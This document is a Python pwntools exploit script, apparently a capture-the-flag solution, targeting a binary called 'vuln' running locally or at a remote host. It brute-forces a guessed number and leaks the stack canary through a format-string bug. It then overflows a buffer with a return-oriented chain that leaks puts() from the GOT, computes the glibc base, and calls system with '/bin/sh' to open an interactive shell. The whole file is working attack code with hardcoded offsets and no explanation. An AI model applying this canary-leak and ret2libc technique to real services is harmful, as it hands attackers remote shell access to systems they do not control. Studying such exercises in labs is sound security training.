#!/usr/bin/env python3

from pwn import context, ELF, log, p32, process, remote, sys, u32

elf = ELF('vuln', checksec=False)
context.binary = elf

def get_process():
    if len(sys.argv) == 1:
        return process(elf.path)

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)

number = 0
number_progress = log.progress('Guessed number')

for i in range(-4096, 4096):
    number_progress.status(str(i))

    with context.local(log_level='CRITICAL'):
        p = get_process()
        p.sendlineafter(b'What number would you like to guess?\n', str(i).encode())

        if b'Congrats!' in p.recvline():
            number = i
            number_progress.success(str(number))
            break

        p.close()

p = get_process()

def dump(n: int) -> str:
    p.sendlineafter(b'What number would you like to guess?\n', str(number).encode())
    p.sendlineafter(b'Name? ', f'%{n}$x'.encode())
    res = p.recvline().decode().strip()
    res = res.lstrip('Congrats: ')
    return res


canary_position = 119
canary = int(dump(canary_position), 16)

log.success(f'Leaked canary: {hex(canary)}')

def send_payload(payload: bytes) -> bytes:
    p.sendlineafter(b'What number would you like to guess?\n', str(number).encode())
    p.sendlineafter(b'Name? ', payload)
    return p.recvline()

offset_to_canary = 512
offset_to_eip = 12

junk_to_canary = b'A' * offset_to_canary
junk_to_eip = b'A' * offset_to_eip

payload  = junk_to_canary
payload += p32(canary)
payload += junk_to_eip

win_addr = 0x0804876e
puts_plt = 0x080484c0
puts_got = 0x08049fdc

payload += p32(puts_plt)
payload += p32(win_addr)
payload += p32(puts_got)

send_payload(payload)
p.recvline()

puts_addr = u32(p.recvline()[:4].ljust(4, b'\0'))

log.success(f'Leaked puts() address: {hex(puts_addr)}')

puts_offset = 0x067460 if len(sys.argv) > 1 else 0x071290
glibc_base_addr = puts_addr - puts_offset

log.success(f'Glibc base address: {hex(glibc_base_addr)}')

payload  = junk_to_canary
payload += p32(canary)
payload += junk_to_eip

system_offset = 0x03ce10 if len(sys.argv) > 1 else 0x045420
bin_sh_offset = 0x17b88f if len(sys.argv) > 1 else 0x18f352

system_addr = glibc_base_addr + system_offset
bin_sh_addr = glibc_base_addr + bin_sh_offset

payload += p32(system_addr)
payload += p32(win_addr)
payload += p32(bin_sh_addr)

p.sendlineafter(b'Name? ', payload)
p.recvline()
p.recvline()

p.interactive()
